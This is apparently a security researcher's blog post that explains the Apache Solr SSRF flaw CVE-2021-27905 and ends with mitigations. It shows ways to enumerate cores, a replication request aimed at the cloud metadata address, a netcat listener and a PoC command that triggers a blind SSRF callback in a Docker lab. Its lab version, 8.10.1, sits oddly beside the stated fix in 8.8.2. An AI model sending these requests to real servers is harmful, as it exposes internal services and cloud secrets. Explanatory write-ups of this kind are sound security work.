---
title: "CVE-2021-27905"
date: 2025-10-19
draft: false
summary: "Understanding CVE-2021-27905 - Apache Solr SSRF"
tags: ["ssrf", "blog"]
categories: ["blog"]
series: ["cve breakdown"]
showToc: true
cover:
  image: "https://cdn.ziomsec.com/cve-2021-27905/cover.webp"
  caption: "CVE-2021-27905 Apache Solr SSRF"
  alt: "Apache Solr Cover"
---

While performing a security assessment, I came across this vulnerability and did some research on what it was and how it could potentially be exploited in real-world scenarios...

## About CVE-2021-27905

**CVE-2021-27905** is a Server Side Request Forgery vulnerability affecting **Apache Solr** prior to version **8.8.2** that allows remote attackers to make arbitrary HTTP requests to internal or external systems through the replication handler's `masterUrl` parameter, potentially exposing internal services or sensitive cloud metadata.

> **Note**: The script and lab used in this blog can be found on my [Github](https://github.com/RIZZZIOM/CVE-2021-27905)

## Background

**Apache Solr** is an open-source **search platform** built on top of **Apache Lucene** (a Java search library). Think of it as a powerful, customizable "search-as-a-service" engine that developers embed in their own applications. It is used for the following reasons:
- **Full-text search:** indexing and searching documents, logs, or websites quickly.
- **Faceted navigation:** like ecommerce filters (brand, price, category).
- **Analytics:** Solr can run queries with aggregations and sorting efficiently.
- **Scalability:** multiple Solr servers can act as a distributed cluster (SolrCloud).

So in most companies, Solr runs **inside their internal network**, powering searches for websites, product catalogs, enterprise data, or logs.

### Solr Architecture

Solr runs as a **Java web service** (typically on port 8983). It exposes a **REST-like HTTP API**; so almost everything we do (search, upload, admin) is an HTTP request. 

| Component      | Description                                                                                                                                              |
| -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Core**       | A single, independent index within a Solr instance. Each core has its own configuration (`solrconfig.xml`, `schema.xml`) and set of indexed data.        |
| **Collection** | In SolrCloud mode, a “collection” is spread across multiple **cores** on different servers (shards + replicas).                                          |
| **Handlers**   | Endpoints defined in `solrconfig.xml` that perform functions, e.g. `/select` for queries, `/update` for adding docs, `/replication` for syncing indexes. |
| **Admin API**  | `/solr/admin/...` endpoints that show info or perform management tasks.                                                                                  |

Since, identifying a valid `core` is crucial for exploiting the vulnerability, let us understand what a Core is...

### Solr `Cores` And Replication Handlers

A `Core` is a self contained search index + its configuration. For example, we might have:

```
/solr/products
/solr/blog
/solr/logs
```

Each of these is a core. Internally, Solr stores each core's data in

```
/var/solr/data/<CORE_NAME>/
```

There are multiple ways to find core names:
1. Admin API: the admin API endpoint can be used to query core names.

```
curl 'http://IP:PORT/solr/admin/cores?indexInfo=false&wt=json'
```

2. Web UI: when Solr runs without authentication, the base UI itself lists cores in the dropdown menu.

![](https://cdn.ziomsec.com/cve-2021-27905/cores_dropdown.webp)

3. Brute force: in many environments, admins follow predictable names like `gettingstarted`, `collection1`, `core0`, `logs`, `products`, `data`, `search` etc. These parts can be brute forced. 

Once we identify a core name, we can construct our replication endpoint. For example, if the core name is `gettingstarted`, the replication endpoint becomes:

```
/solr/gettingstarted/replication
```

Replication is a Solr feature. When we have multiple Solr nodes (leader-follower setup), we need the followers to copy the latest index files from the leader. This is done using the `ReplicationHandler`.

The request made for replication looks like this:

```
http://IP:PORT/solr/<core>/replication?command=fetchindex&masterUrl=http://leader.internal:8983/solr/<core>
```
> The follower fetches index  data from the leader's URL.

**This is where the vulnerability lies...**

### SSRF

The replication feature is handled by 2 main classes inside **`solr-core`**:
1. **`org.apache.solr.handler.ReplicationHandler`** - this parses the incoming replication requests and reads the `masterUrl` / `leaderUrl` from the HTTP request. In the affected versions, these parameters were not validated.
2. **`org.apache.solr.handler.IndexFetcher`** - this uses that URL to perform the actual HTTP request and pull index files from the provided location. 

Because **`ReplicationHandler`** failed to validate the `masterUrl`, attackers could supply any arbitrary URL. If the URL pointed to an external source, Solr would connect to it.

Anyone who could reach the HTTP port, could send a request given below and make Solr fetch an internal resource:

```
http://IP:PORT/solr/gettingstarted/replication?command=fetchindex&masterUrl=http://169.254.169.254/latest/meta-data/
```

This caused Solr to make an outbound request from the server itself, leading to **Server-Side Request Forgery (SSRF)**.

## Exploiting The Vulnerability

### Lab Setup

- A local lab can be setup by running the following commands:

```shell
# clone the repository
git clone https://github.com/RIZZZIOM/CVE-2021-27905.git
cd CVE-2021-27905/lab/ # contains docker-compose.yml

# run Apache Solr 8.10.1 using docker
docker compose up -d

# verify accessibility
docker ps
curl 'http://127.0.0.1:8983/solr'
# By default, the loopback IP is used to host Solr, to make it accessible externally, you can edit the 'docker-compose.yml' file. 
```

> In the lab, since we started Solr for the first time with `solr-precreate gettingstarted`, it automatically created a core named `gettingstarted` using the default configset.

### Blind SSRF

- Since our Solr instance is running on 8983, we can make the server make a callback to another system on the same network.
- Start a netcat listener on a different system:

```shell
nc -lnvp 1337
```

- Then we can run the PoC to get a callback on our **netcat** listener:

```shell
$ python3 cve-2021-27905.py --target http://127.0.0.1:8983 --payload http://192.168.1.103:1337/test
[+] Performing SSRF
[+] SSRF Exploit Sent Successfully
```

![](https://cdn.ziomsec.com/cve-2021-27905/ssrf_callback.webp)

> While researching this topic, I came across a blog post that demonstrates how it's even possible to achieve **RCE** through this method. It's definitely worth a read for anyone interested:  https://www.hacefresko.com/posts/rce-on-solr-server-via-replication

## Mitigations

Solr maintainers patched this vulnerability by fixing the `ReplicationHandler` to:
- Validate that `masterUrl` / `leaderUrl` points only to approved hosts.
- Restrict acceptable URL schemas (`http`, `https`)
- Harden remote streaming features.
- Recommend admins to secure `/replication` with authentication or remove it entirely if unused.

## References

- https://svn.apache.org/repos/infra/sites/solr/docs/8_8_1/solr-core/org/apache/solr/handler/ReplicationHandler.html
- https://nvd.nist.gov/vuln/detail/CVE-2021-27905
- https://github.com/veracode-research/solr-injection

---

That concludes my blog!
Until next time :)

---

